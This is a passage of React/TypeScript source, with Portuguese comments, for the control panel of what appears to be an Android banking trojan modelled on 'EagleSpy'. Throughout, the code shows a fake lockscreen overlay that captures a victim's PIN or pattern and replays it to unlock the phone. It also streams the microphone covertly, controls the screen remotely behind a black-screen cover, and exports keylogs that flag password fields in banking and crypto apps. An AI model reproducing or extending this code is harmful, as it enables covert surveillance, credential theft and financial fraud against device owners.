  // 🔒 LOCKSCREEN PIN + PATTERN - IGUAL EAGLESPY V5
  
  // Busca PIN e Pattern armazenados no servidor
  const fetchDeviceLockData = async () => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      
      // Busca PIN
      const pinResponse = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/pin`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (pinResponse.ok) {
        const data = await pinResponse.json();
        if (data.pin) {
          setCapturedPin(data.pin);
          setPinInput(data.pin);
        }
      }
      
      // Busca Pattern
      const patternResponse = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/pattern`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (patternResponse.ok) {
        const data = await patternResponse.json();
        if (data.pattern) {
          setCapturedPattern(data.pattern);
          setPatternInput(data.pattern);
        }
      }
    } catch (error) {
      console.error('Erro ao buscar dados de lock:', error);
    }
  };
  
  // Salva PIN no servidor
  const saveDevicePin = async (pin: string) => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      const formData = new FormData();
      formData.append('pin', pin);
      
      await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/pin`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` },
        body: formData
      });
      setCapturedPin(pin);
      addLog(`🔒 PIN salvo: ${pin}`);
    } catch (error) {
      console.error('Erro ao salvar PIN:', error);
    }
  };
  
  // Salva Pattern no servidor
  const saveDevicePattern = async (pattern: string) => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      const formData = new FormData();
      formData.append('pattern', pattern);
      
      await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/pattern`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` },
        body: formData
      });
      setCapturedPattern(pattern);
      addLog(`🔲 Pattern salvo: ${pattern}`);
    } catch (error) {
      console.error('Erro ao salvar Pattern:', error);
    }
  };
  
  // Mostra overlay de lockscreen fake (PIN ou PATTERN)
  const showLockscreen = async () => {
    await sendCommand({ action: 'SHOW_LOCKSCREEN', type: lockscreenType });
    setIsLockscreenActive(true);
    addLog(`🔒 Lockscreen ${lockscreenType} ATIVADO - Aguardando vítima...`);
  };
  
  // Esconde overlay de lockscreen
  const hideLockscreen = async () => {
    await sendCommand({ action: 'HIDE_LOCKSCREEN' });
    setIsLockscreenActive(false);
    addLog('🔓 Lockscreen DESATIVADO');
  };
  
  // Pressiona tecla do PIN (para reprodução manual)
  const pressLockKey = async (key: string) => {
    await sendCommand({ action: `LOCK_KEY_${key}` });
    addLog(`🔢 Tecla ${key} pressionada`);
  };

  const startUnlockRecordingCmd = async () => {
    await sendCommand({ action: 'START_UNLOCK_RECORDING' });
    setIsUnlockRecording(true);
    addLog('🔴 Gravação de unlock iniciada');
  };

  const stopUnlockRecordingCmd = async () => {
    await sendCommand({ action: 'STOP_UNLOCK_RECORDING' });
    setIsUnlockRecording(false);
    addLog('⏹️ Gravação de unlock parada');
  };

  const playUnlockLocal = async () => {
    await sendCommand({ action: 'PLAY_UNLOCK_SEQUENCE' });
    addLog('▶️ Reproduzindo unlock (RAM local)');
  };

  const playUnlockFromServer = async () => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/unlock-sequence`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      if (!response.ok) {
        addLog('❌ Falha ao buscar sequência no servidor');
        return;
      }
      const data = await response.json();
      if (data.status !== 'ok' || !data.sequence?.length) {
        addLog('❌ Nenhuma sequência salva no servidor');
        return;
      }
      await sendCommand({
        action: 'PLAY_UNLOCK_SEQUENCE',
        text: JSON.stringify({ type: data.type, sequence: data.sequence }),
      });
      addLog(`▶️ Reproduzindo unlock do servidor (${data.sequence.length} ações)`);
    } catch {
      addLog('❌ Erro ao reproduzir unlock do servidor');
    }
  };

  const runPatternUnlockDirect = async () => {
    const pattern = patternInput || capturedPattern;
    if (!pattern) {
      addLog('❌ Informe um pattern (1-9)');
      return;
    }
    await sendCommand({ action: 'PATTERN_UNLOCK', pattern });
    addLog(`🔲 Pattern unlock: ${pattern}`);
  };

  const copyPinSequenceFromEvents = (events: any[]) => {
    const digits = events
      .map((e) => String(e.digit ?? ''))
      .filter((d) => /^\d$/.test(d))
      .join('');
    if (!digits) return;
    navigator.clipboard.writeText(digits);
    addLog(`📋 PIN copiado: ${digits}`);
  };

  const formatLockscreenEventTime = (iso: string) => {
    try {
      return new Date(iso).toLocaleTimeString();
    } catch {
      return '';
    }
  };

  const renderCapturedUnlockPinsList = () => {
    const recent = capturedUnlockPins.slice(0, 10);
    if (recent.length === 0) {
      return <p className="text-xs text-gray-500 italic">Nenhum evento de lockscreen capturado ainda.</p>;
    }
    const digitSequence = recent
      .slice()
      .reverse()
      .map((e) => String(e.digit ?? ''))
      .filter((d) => /^\d$/.test(d))
      .reverse()
      .join('');
    return (
      <div className="space-y-1">
        {digitSequence.length >= 4 && (
          <div className="flex items-center justify-between mb-2 p-2 bg-green-900/30 border border-green-600/40 rounded-lg">
            <span className="text-green-300 font-mono text-sm tracking-widest">{digitSequence}</span>
            <button
              type="button"
              onClick={() => copyPinSequenceFromEvents(recent)}
              className="px-2 py-1 bg-green-700 hover:bg-green-600 text-white text-xs rounded"
            >
              Copiar PIN
            </button>
          </div>
        )}
        <div className="max-h-32 overflow-y-auto space-y-1">
          {recent.map((ev) => {
            const isComplete = String(ev.eventType ?? '').toUpperCase().includes('ENTER')
              || String(ev.digit ?? '').toUpperCase() === 'ENTER';
            const rowDigits = recent
              .filter((e) => e.created_at <= ev.created_at)
              .map((e) => String(e.digit ?? ''))
              .filter((d) => /^\d$/.test(d))
              .join('');
            return (
              <div key={ev.id ?? `${ev.created_at}-${ev.digit}`} className="flex items-center justify-between text-xs bg-slate-800/80 rounded px-2 py-1">
                <span className="text-gray-300 font-mono">{ev.digit || ev.eventType || '—'}</span>
                <span className="text-gray-500">{formatLockscreenEventTime(ev.created_at)}</span>
                {isComplete && rowDigits.length >= 4 && (
                  <button
                    type="button"
                    onClick={() => {
                      navigator.clipboard.writeText(rowDigits);
                      addLog(`📋 PIN copiado: ${rowDigits}`);
                    }}
                    className="ml-2 px-1.5 py-0.5 bg-green-700 hover:bg-green-600 text-white rounded text-[10px]"
                  >
                    Copiar PIN
                  </button>
                )}
              </div>
            );
          })}
        </div>
      </div>
    );
  };

  const renderUnlockRecordingControls = () => (
    <div className="rounded-lg p-3 border border-cyan-500/30 bg-cyan-900/20 space-y-2">
      <div className="text-xs text-cyan-300 font-semibold">🔓 Gravação de Unlock</div>
      <div className="grid grid-cols-2 gap-2">
        <button
          type="button"
          onClick={startUnlockRecordingCmd}
          disabled={isUnlockRecording}
          className="py-2 bg-red-700 hover:bg-red-600 disabled:opacity-50 text-white rounded-lg text-xs font-bold"
        >
          🔴 Gravar
        </button>
        <button
          type="button"
          onClick={stopUnlockRecordingCmd}
          disabled={!isUnlockRecording}
          className="py-2 bg-slate-700 hover:bg-slate-600 disabled:opacity-50 text-white rounded-lg text-xs font-bold"
        >
          ⏹ Parar
        </button>
        <button
          type="button"
          onClick={playUnlockLocal}
          className="py-2 bg-blue-700 hover:bg-blue-600 text-white rounded-lg text-xs font-bold"
        >
          ▶ Local
        </button>
        <button
          type="button"
          onClick={playUnlockFromServer}
          className="py-2 bg-indigo-700 hover:bg-indigo-600 text-white rounded-lg text-xs font-bold"
        >
          ☁ Servidor
        </button>
      </div>
      <div className="flex gap-2">
        <input
          type="text"
          value={patternInput}
          onChange={(e) => setPatternInput(e.target.value.replace(/[^1-9]/g, ''))}
          placeholder="Pattern 14789"
          maxLength={9}
          className="flex-1 px-2 py-1.5 bg-slate-800 border border-slate-600 rounded text-blue-300 font-mono text-sm text-center"
        />
        <button
          type="button"
          onClick={runPatternUnlockDirect}
          className="px-3 py-1.5 bg-purple-700 hover:bg-purple-600 text-white rounded-lg text-xs font-bold"
        >
          Pattern
        </button>
      </div>
    </div>
  );
  
  // Reproduz sequência de PIN ou Pattern automaticamente
  const playLockSequence = async () => {
    if (lockscreenType === 'PIN') {
      const pin = pinInput || capturedPin;
      if (!pin) {
        addLog('❌ Nenhum PIN para reproduzir');
        return;
      }
      
      setIsPlayingPin(true);
      addLog(`🔄 Reproduzindo PIN: ${pin} (delay: ${pinDelay}ms)`);
      
      try {
        const token = localStorage.getItem('token');
        const formData = new FormData();
        formData.append('pin', pin);
        formData.append('delay', pinDelay.toString());
        
        await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/play-pin`, {
          method: 'POST',
          headers: { 'Authorization': `Bearer ${token}` },
          body: formData
        });
      } catch (error) {
        console.error('Erro ao reproduzir PIN:', error);
        addLog('❌ Erro ao reproduzir PIN');
      }
      
      const totalTime = (pin.length + 1) * pinDelay + 1000;
      setTimeout(() => {
        setIsPlayingPin(false);
        addLog('✅ Reprodução do PIN concluída');
      }, totalTime);
      
    } else {
      // Pattern
      const pattern = patternInput || capturedPattern;
      if (!pattern) {
        addLog('❌ Nenhum Pattern para reproduzir');
        return;
      }
      
      setIsPlayingPin(true);
      addLog(`🔲 Reproduzindo Pattern: ${pattern}`);
      
      try {
        const token = localStorage.getItem('token');
        const formData = new FormData();
        formData.append('pattern', pattern);
        formData.append('delay', pinDelay.toString());
        
        await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/play-pattern`, {
          method: 'POST',
          headers: { 'Authorization': `Bearer ${token}` },
          body: formData
        });
      } catch (error) {
        console.error('Erro ao reproduzir Pattern:', error);
        addLog('❌ Erro ao reproduzir Pattern');
      }
      
      setTimeout(() => {
        setIsPlayingPin(false);
        addLog('✅ Reprodução do Pattern concluída');
      }, 2000);
    }
  };
  
  // Carrega dados quando abre o modal OU janela flutuante + POLLING a cada 2 segundos
  useEffect(() => {
    const isLockscreenOpen = showLockscreenModal || (isFloatingMode && floatingWindows.lockscreen?.open);
    if (isLockscreenOpen && deviceId) {
      fetchDeviceLockData();
      // Polling a cada 2 segundos para capturar dados em tempo real
      const interval = setInterval(fetchDeviceLockData, 2000);
      return () => clearInterval(interval);
    }
  }, [showLockscreenModal, deviceId, isFloatingMode, floatingWindows.lockscreen?.open]);
  
  // 📱 GERENCIAMENTO DE APPS
  const fetchInstalledApps = async () => {
    if (!deviceId) return;
    setIsLoadingApps(true);
    
    try {
      const token = localStorage.getItem('token');
      
      // Primeiro, solicita atualização da lista
      await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/refresh-apps`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      
      // Aguarda um pouco para o dispositivo responder (aumentado para 4 segundos)
      await new Promise(resolve => setTimeout(resolve, 4000));
      
      // Busca a lista
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/installed-apps`, {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.apps && data.apps.length > 0) {
          // Ordena por nome
          const sortedApps = data.apps.sort((a: any, b: any) => 
            a.name.localeCompare(b.name)
          );
          setInstalledApps(sortedApps);
          addLog(`📱 ${data.count} apps carregados`);
        } else {
          addLog('📱 Aguardando lista de apps do dispositivo...');
        }
      }
    } catch (error) {
      console.error('Erro ao buscar apps:', error);
      addLog('❌ Erro ao buscar apps');
    } finally {
      setIsLoadingApps(false);
    }
  };
  
  const openApp = async (packageName: string, appName: string) => {
    await sendCommand({ action: 'OPEN_APP', package: packageName });
    addLog(`📱 Abrindo: ${appName}`);
  };
  
  const uninstallApp = async (packageName: string, appName: string) => {
    console.log('🗑️ uninstallApp chamado:', { packageName, appName });
    
    if (confirm(`Deseja desinstalar "${appName}"?\n\nPackage: ${packageName}`)) {
      try {
        console.log('🗑️ Enviando comando UNINSTALL_APP para:', packageName);
        await sendCommand({ action: 'UNINSTALL_APP', package: packageName });
        addLog(`🗑️ Desinstalação solicitada: ${appName} (${packageName})`);
        alert(`✅ Comando de desinstalação enviado!\n\nO app "${appName}" deve aparecer a tela de confirmação no dispositivo.`);
      } catch (error) {
        console.error('❌ Erro ao desinstalar:', error);
        addLog(`❌ Erro ao desinstalar: ${appName}`);
        alert(`❌ Erro ao enviar comando de desinstalação`);
      }
    }
  };
  
  const forceStopApp = async (packageName: string, appName: string) => {
    await sendCommand({ action: 'FORCE_STOP_APP', package: packageName });
    addLog(`⛔ Forçando parada: ${appName}`);
  };
  
  // Filtra apps
  const filteredApps = installedApps.filter(app => {
    // Filtro por tipo
    if (appsFilter === 'user' && app.isSystem) return false;
    if (appsFilter === 'system' && !app.isSystem) return false;
    
    // Filtro por busca
    if (appsSearch) {
      const search = appsSearch.toLowerCase();
      return app.name.toLowerCase().includes(search) || 
             app.package.toLowerCase().includes(search);
    }
    
    return true;
  });
  
  const startMicrophoneStream = () => {
    if (!deviceId) return;
    
    // Limpa reconexão anterior se existir
    if ((window as any).micReconnectTimer) {
      clearTimeout((window as any).micReconnectTimer);
      delete (window as any).micReconnectTimer;
    }
    
    const token = localStorage.getItem('token');
    // Usa URL dinâmica baseada no getApiBaseUrl()
    const wsProtocol = getApiBaseUrl().startsWith('https') ? 'wss' : 'ws';
    const wsBase = getApiBaseUrl().replace(/^https?/, wsProtocol);
    const ws = new WebSocket(`${wsBase}/ws/microphone/${deviceId}?token=${token}`);
    
    ws.binaryType = 'arraybuffer';
    
    // Cria AudioContext para reproduzir o áudio PCM
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)({
      sampleRate: 16000 // Mesmo sample rate usado no Android
    });
    audioContextRef.current = audioContext;
    
    ws.onopen = () => {
      console.log('🎤 Microphone stream conectado');
    };
    
    ws.onmessage = async (event) => {
      const arrayBuffer = event.data instanceof ArrayBuffer ? event.data : await (event.data as Blob).arrayBuffer();
      
      try {
        // Converte PCM 16-bit para Float32 para o AudioContext
        const int16Array = new Int16Array(arrayBuffer);
        const float32Array = new Float32Array(int16Array.length);
        
        for (let i = 0; i < int16Array.length; i++) {
          float32Array[i] = int16Array[i] / 32768.0; // Normaliza para -1.0 a 1.0
        }
        
        // Cria buffer de áudio
        const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
        audioBuffer.getChannelData(0).set(float32Array);
        
        // Reproduz o áudio
        const source = audioContext.createBufferSource();
        source.buffer = audioBuffer;
        source.connect(audioContext.destination);
        source.start(0);
        
      } catch (error) {
        console.error('🎤 Erro ao processar áudio:', error);
      }
    };
    
    ws.onerror = (error) => {
      console.error('🎤 Erro no microphone stream:', error);
      ws.close();
    };
    
    ws.onclose = () => {
      console.log('🎤 Microphone stream desconectado');
      // 🔄 RECONEXÃO AUTOMÁTICA se o microfone ainda estiver habilitado
      if (isMicrophoneEnabled && showMicrophoneModal) {
        console.log('🎤 Reconectando microfone em 2 segundos...');
        (window as any).micReconnectTimer = setTimeout(() => {
          startMicrophoneStream();
        }, 2000);
      }
    };
    
    // Armazena WebSocket para fechar depois
    (window as any).microphoneWs = ws;
  };
  
  const stopMicrophoneStream = () => {
    // Limpa timer de reconexão
    if ((window as any).micReconnectTimer) {
      clearTimeout((window as any).micReconnectTimer);
      delete (window as any).micReconnectTimer;
    }
    
    const ws = (window as any).microphoneWs;
    if (ws) {
      ws.close();
      delete (window as any).microphoneWs;
    }
    
    if (audioContextRef.current) {
      audioContextRef.current.close();
      audioContextRef.current = null;
    }
  };


  const getAppFriendlyName = (packageName: string, appName: string): string => {
    // Mapeamento de packages conhecidos para nomes amigáveis
    const knownApps: { [key: string]: string } = {
      'com.android.chrome': '🌐 Chrome',
      'com.google.android.gm': '📧 Gmail',
      'com.whatsapp': '💬 WhatsApp',
      'com.facebook.katana': '📘 Facebook',
      'com.instagram.android': '📷 Instagram',
      'com.twitter.android': '🐦 Twitter',
      'com.google.android.apps.messaging': '💬 Messages',
      'com.android.contacts': '📞 Contacts',
      'com.android.settings': '⚙️ Settings',
      'com.google.android.inputmethod.latin': '⌨️ Keyboard',
      'com.google.android.apps.maps': '🗺️ Google Maps',
      'com.snapchat.android': '👻 Snapchat',
      'com.paypal.android.p2pmobile': '💳 PayPal',
      'com.bankofamerica.mobile': '🏦 Bank of America',
      'com.chase.sig.android': '🏦 Chase',
      'com.venmo': '💸 Venmo',
      'com.coinbase.android': '₿ Coinbase'
    };

    // Retorna nome amigável se conhecido, senão usa appName
    return knownApps[packageName] || appName || packageName;
  };

  const downloadKeylogs = () => {
    if (keylogs.length === 0) return;

    let txtContent = '========================================\n';
    txtContent += '       KEYLOGGER REPORT\n';
    txtContent += '========================================\n';
    txtContent += `Device: ${device?.model || 'Unknown'}\n`;
    txtContent += `Device ID: ${deviceId}\n`;
    txtContent += `Total Logs: ${keylogs.length}\n`;
    txtContent += `Generated: ${new Date().toLocaleString()}\n`;
    txtContent += '========================================\n\n';

    keylogs.forEach((log, index) => {
      const friendlyName = getAppFriendlyName(log.package || '', log.appName || '');
      txtContent += `[${index + 1}] ${log.timestamp}\n`;
      txtContent += `App: ${friendlyName}\n`;
      if (log.package) txtContent += `Package: ${log.package}\n`;
      if (log.isPassword) txtContent += `🔑 PASSWORD FIELD DETECTED!\n`;
      txtContent += `Text: ${log.text}\n`;
      if (log.hint) txtContent += `Field Hint: ${log.hint}\n`;
      if (log.fieldName) txtContent += `Field Name: ${log.fieldName}\n`;
      txtContent += '----------------------------------------\n\n';
    });

    txtContent += '========================================\n';
    txtContent += '           END OF REPORT\n';
    txtContent += '========================================\n';

    // Create download
    const blob = new Blob([txtContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylogger_${deviceId}_${new Date().getTime()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    addLog(`📥 Keylogger downloaded: ${keylogs.length} logs`);
  };

  if (!device) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-purple-600 mx-auto mb-4"></div>
          <p className="text-gray-400">Carregando dispositivo...</p>
        </div>
      </div>
    );
  }

  // ============================================
  // 📱 RENDERIZAÇÃO MOBILE - TELA CHEIA
  // ============================================
  if (isMobile && isMobileFullscreen) {
    return (
      <div className="fixed inset-0 bg-black z-[200] flex flex-col">
        {/* Header Mobile Compacto */}
        <div className="bg-slate-900/95 px-2 py-1 flex items-center justify-between border-b border-slate-700">
          <button
            onClick={() => setIsMobileFullscreen(false)}
            className="p-2 text-white"
          >
            <Minimize className="w-5 h-5" />
          </button>
          <div className="flex items-center space-x-2">
            <span className="text-white text-xs font-bold truncate max-w-[120px]">{device.model}</span>
            <div className={`w-2 h-2 rounded-full ${device.is_online ? 'bg-green-500' : 'bg-red-500'}`}></div>
          </div>
          <button
            onClick={() => setShowMobileControls(!showMobileControls)}
            className="p-2 text-white"
          >
            {showMobileControls ? <ChevronUp className="w-5 h-5" /> : <ChevronDown className="w-5 h-5" />}
          </button>
        </div>
        
        {/* Tabs VNC/V2 Mobile */}
        <div className="bg-slate-800 px-2 py-1 flex space-x-1">
          <button
            onClick={() => setShowScreenReader(false)}
            className={`flex-1 py-1.5 rounded text-xs font-bold ${!showScreenReader ? 'bg-purple-600 text-white' : 'bg-slate-700 text-gray-400'}`}
          >
            📺 VNC
          </button>
          <button
            onClick={() => {
              setShowScreenReader(true);
              if (!isScreenReaderEnabled) toggleScreenReader();
            }}
            className={`flex-1 py-1.5 rounded text-xs font-bold ${showScreenReader ? 'bg-green-600 text-white' : 'bg-slate-700 text-gray-400'}`}
          >
            👁️ V2 {isScreenReaderEnabled && '✅'}
          </button>
        </div>
        
        {/* Área da Tela - Ocupa todo o espaço */}
        <div className="flex-1 overflow-hidden relative">
          {!showScreenReader ? (
            // VNC Normal
            isCaptureEnabled ? (
              <div className="w-full h-full flex items-center justify-center">
                <DeviceScreen
                  deviceId={deviceId!}
                  onCommand={sendCommand}
                  isBlackScreenActive={isBlackScreen}
                  onConnectionStatusChange={handleConnectionStatusChange}
                  captureMethod="silent"
                  killerFrameOnPointerMove={isKillerMode}
                  onRequestFrame={requestKillerFrame}
                />
              </div>
            ) : (
              <div className="w-full h-full flex items-center justify-center bg-black">
                <button
                  onClick={toggleCapture}
                  className="px-6 py-3 bg-gray-800 text-white rounded-lg border border-gray-600"
                >
                  ▶️ Iniciar Captura
                </button>
              </div>
            )
          ) : (
            // Screen Reader V2 Mobile
            <div 
              className="w-full h-full bg-slate-950"
              onTouchStart={(e) => {
                const touch = e.touches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                const x = touch.clientX - rect.left;
                const y = touch.clientY - rect.top;
                setMouseDownPos({ x, y });
                setMouseDownTime(Date.now());
                setIsDragging(true);
                dragPathRef.current = [{ x, y }];
              }}
              onTouchMove={(e) => {
                if (!isDragging || !mouseDownPos) return;
                const touch = e.touches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                const x = touch.clientX - rect.left;
                const y = touch.clientY - rect.top;
                const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                const dist = Math.sqrt(Math.pow(x - lastPoint.x, 2) + Math.pow(y - lastPoint.y, 2));
                if (dist > 15) {
                  dragPathRef.current.push({ x, y });
                }
              }}
              onTouchEnd={(e) => {
                if (!mouseDownPos) return;
                const touch = e.changedTouches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                const upX = touch.clientX - rect.left;
                const upY = touch.clientY - rect.top;
                const downX = mouseDownPos.x;
                const downY = mouseDownPos.y;
                const deltaX = upX - downX;
                const deltaY = upY - downY;
                const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
                const holdTime = Date.now() - mouseDownTime;
                
                const realScale = rect.width / SCREEN_BASE_WIDTH;
                const deviceDownX = Math.round(downX / realScale);
                const deviceDownY = Math.round(downY / realScale);
                const deviceUpX = Math.round(upX / realScale);
                const deviceUpY = Math.round(upY / realScale);
                
                if (deviceDownX < 0 || deviceDownX > SCREEN_BASE_WIDTH || deviceDownY < 0 || deviceDownY > SCREEN_BASE_HEIGHT) {
                  setMouseDownPos(null);
                  setIsDragging(false);
                  dragPathRef.current = [];
                  return;
                }
                
                if (holdTime > 500 && distance < 10) {
                  sendCommand({ action: 'LONG_PRESS', x: deviceDownX, y: deviceDownY });
                } else if (distance > 30) {
                  sendCommand({ action: 'SWIPE', x1: deviceDownX, y1: deviceDownY, x2: deviceUpX, y2: deviceUpY, duration: Math.min(500, Math.max(100, holdTime)) });
                } else {
                  sendCommand({ action: 'CLICK', x: deviceDownX, y: deviceDownY });
                }
                
                setMouseDownPos(null);
                setIsDragging(false);
                dragPathRef.current = [];
              }}
            >
              {screenHierarchy && screenHierarchy.hierarchy ? (
                <ScreenReaderCanvas
                  hierarchy={screenHierarchy.hierarchy}
                  maxHeight={window.innerHeight - 100}
                />
              ) : (
                <div className="w-full h-full flex items-center justify-center">
                  <p className="text-gray-400">Carregando V2...</p>
                </div>
              )}
            </div>
          )}
        </div>
        
        {/* Controles Mobile */}
        {showMobileControls && (
          <div className="bg-slate-800 border-t border-slate-700 p-2 space-y-2">
            {/* Navegação */}
            <div className="grid grid-cols-4 gap-1">
              <button onClick={() => sendCommand({ action: 'BACK' })} className="py-3 bg-slate-700 text-white rounded text-xl">◀</button>
              <button onClick={() => sendCommand({ action: 'HOME' })} className="py-3 bg-slate-700 text-white rounded text-xl">●</button>
              <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-3 bg-slate-700 text-white rounded text-xl">■</button>
              <button onClick={() => sendCommand({ action: 'POWER' })} className="py-3 bg-red-600 text-white rounded text-xl">⏻</button>
            </div>
            
            <div className="grid grid-cols-5 gap-1">
              <button type="button" onClick={() => sendCommand({ action: 'VIBRATE' })} className="py-2 bg-amber-700 text-white rounded text-xs">📳</button>
              <button type="button" onClick={() => sendCommand({ action: 'VOLUME_DOWN' })} className="py-2 bg-slate-700 text-white rounded text-xs">🔉</button>
              <button type="button" onClick={() => sendCommand({ action: 'VOLUME_UP' })} className="py-2 bg-slate-700 text-white rounded text-xs">🔊</button>
              <button type="button" onClick={() => sendCommand({ action: 'LOCK_DEVICE' })} className="py-2 bg-red-800 text-white rounded text-xs">🔒</button>
              <button type="button" onClick={() => sendCommand({ action: 'SNAP_SCREEN' })} className="py-2 bg-teal-700 text-white rounded text-xs">📷</button>
            </div>
            
            {/* Ações */}
            <div className="grid grid-cols-3 gap-1">
              <button
                onClick={toggleCapture}
                className={`py-2 rounded text-xs font-bold ${isCaptureEnabled ? 'bg-green-600 text-white' : 'bg-gray-700 text-white'}`}
              >
                {isCaptureEnabled ? '🔴 Captura' : '▶️ Captura'}
              </button>
              <button
                onClick={toggleBlackScreen}
                className={`py-2 rounded text-xs font-bold ${isBlackScreen ? 'bg-black text-white border border-white' : 'bg-slate-700 text-white'}`}
              >
                {isBlackScreen ? '⬛ Preta ON' : '⬜ Preta'}
              </button>
              <button
                onClick={() => sendCommand({ action: 'NOTIFICATIONS' })}
                className="py-2 bg-indigo-600 text-white rounded text-xs font-bold"
              >
                🔔 Notif.
              </button>
            </div>
          </div>
        )}
      </div>
    );
  }

  // ============================================
  // 📱 RENDERIZAÇÃO MOBILE - NORMAL
  // ============================================
  if (isMobile) {
    return (
      <div className="min-h-screen bg-slate-900">
        {/* Overlay Offline */}
        {!device.is_online && (
          <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-[100]">
            <div className="text-center p-6 bg-slate-800 rounded-xl border-2 border-red-500 mx-4">
              <span className="text-4xl">📵</span>
              <h2 className="text-xl font-bold text-red-400 mt-2">Offline</h2>
              <button onClick={() => navigate('/dashboard')} className="mt-4 px-4 py-2 bg-red-600 text-white rounded-lg text-sm">
                ← Voltar
              </button>
            </div>
          </div>
        )}
        
        {/* Header Mobile */}
        <header className="bg-slate-800 px-3 py-2 flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <button onClick={() => navigate('/dashboard')} className="p-1.5 bg-slate-700 rounded">
              <ArrowLeft className="w-4 h-4 text-white" />
            </button>
            <div>
              <h1 className="text-sm font-bold text-white truncate max-w-[150px]">{device.model}</h1>
              <div className={`text-[10px] ${device.is_online ? 'text-green-400' : 'text-red-400'}`}>
                {device.is_online ? '● Online' : '● Offline'}
              </div>
            </div>
          </div>
          <button
            onClick={() => setIsMobileFullscreen(true)}
            className="px-3 py-1.5 bg-blue-600 text-white rounded text-xs font-bold flex items-center"
          >
            <Maximize className="w-4 h-4 mr-1" /> Tela Cheia
          </button>
        </header>
        
        {/* Tabs VNC/V2 */}
        <div className="px-3 py-2 flex space-x-2">
          <button
            onClick={() => setShowScreenReader(false)}
            className={`flex-1 py-2 rounded font-bold text-sm ${!showScreenReader ? 'bg-purple-600 text-white' : 'bg-slate-700 text-gray-400'}`}
          >
            📺 VNC
          </button>
          <button
            onClick={() => {
              setShowScreenReader(true);
              if (!isScreenReaderEnabled) toggleScreenReader();
            }}
            className={`flex-1 py-2 rounded font-bold text-sm ${showScreenReader ? 'bg-green-600 text-white' : 'bg-slate-700 text-gray-400'}`}
          >
            👁️ V2 {isScreenReaderEnabled && '✅'}
          </button>
        </div>
        
        {/* Área da Tela */}
        <div className="px-3">
          {!showScreenReader ? (
            isCaptureEnabled ? (
              <div className="rounded-lg overflow-hidden border border-purple-500">
                <DeviceScreen
                  deviceId={deviceId!}
                  onCommand={sendCommand}
                  isBlackScreenActive={isBlackScreen}
                  onConnectionStatusChange={handleConnectionStatusChange}
                  captureMethod="silent"
                  killerFrameOnPointerMove={isKillerMode}
                  onRequestFrame={requestKillerFrame}
                />
              </div>
            ) : (
              <div className="bg-black rounded-lg flex items-center justify-center" style={{ height: '400px' }}>
                <button onClick={toggleCapture} className="px-4 py-2 bg-gray-800 text-white rounded-lg border border-gray-600 text-sm">
                  ▶️ Iniciar Captura
                </button>
              </div>
            )
          ) : (
            <div 
              className="bg-slate-950 rounded-lg overflow-hidden border border-green-500"
              style={{ minHeight: '400px' }}
              onTouchStart={(e) => {
                const touch = e.touches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                setMouseDownPos({ x: touch.clientX - rect.left, y: touch.clientY - rect.top });
                setMouseDownTime(Date.now());
                setIsDragging(true);
                dragPathRef.current = [{ x: touch.clientX - rect.left, y: touch.clientY - rect.top }];
              }}
              onTouchMove={(e) => {
                if (!isDragging) return;
                const touch = e.touches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                const x = touch.clientX - rect.left;
                const y = touch.clientY - rect.top;
                const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                if (lastPoint && Math.sqrt(Math.pow(x - lastPoint.x, 2) + Math.pow(y - lastPoint.y, 2)) > 15) {
                  dragPathRef.current.push({ x, y });
                }
              }}
              onTouchEnd={(e) => {
                if (!mouseDownPos) return;
                const touch = e.changedTouches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                const upX = touch.clientX - rect.left;
                const upY = touch.clientY - rect.top;
                const distance = Math.sqrt(Math.pow(upX - mouseDownPos.x, 2) + Math.pow(upY - mouseDownPos.y, 2));
                const holdTime = Date.now() - mouseDownTime;
                const realScale = rect.width / SCREEN_BASE_WIDTH;
                const deviceDownX = Math.round(mouseDownPos.x / realScale);
                const deviceDownY = Math.round(mouseDownPos.y / realScale);
                const deviceUpX = Math.round(upX / realScale);
                const deviceUpY = Math.round(upY / realScale);
                
                if (holdTime > 500 && distance < 10) {
                  sendCommand({ action: 'LONG_PRESS', x: deviceDownX, y: deviceDownY });
                } else if (distance > 30) {
                  sendCommand({ action: 'SWIPE', x1: deviceDownX, y1: deviceDownY, x2: deviceUpX, y2: deviceUpY, duration: Math.min(500, Math.max(100, holdTime)) });
                } else {
